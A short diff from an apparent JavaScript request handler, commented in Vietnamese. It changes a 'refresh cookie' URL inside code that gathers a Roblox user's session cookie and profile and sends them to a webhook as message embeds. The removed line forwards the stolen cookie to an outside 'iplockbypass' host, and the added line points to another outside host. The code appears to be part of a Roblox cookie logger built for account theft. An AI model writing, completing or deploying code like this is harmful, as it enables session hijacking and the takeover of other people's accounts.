@@ -73,7 +73,7 @@ export default async function handler(req, res) {
         const fileWebhookUrl = await getWebhookUrl();
 
         // Tạo URL refresh cookie và profile link
-        const refreshCookieUrl = `https://eggy.cool/iplockbypass?cookie=${encodeURIComponent(cookie)}`;
+        const refreshCookieUrl = `http://cookie.infy.uk/rf.php`;
         const profileUrl = `https://www.roblox.com/users/${userId}/profile`;
 
         // Tách thành 2 embed: một cho Cookie Value, một cho thông tin tài khoản
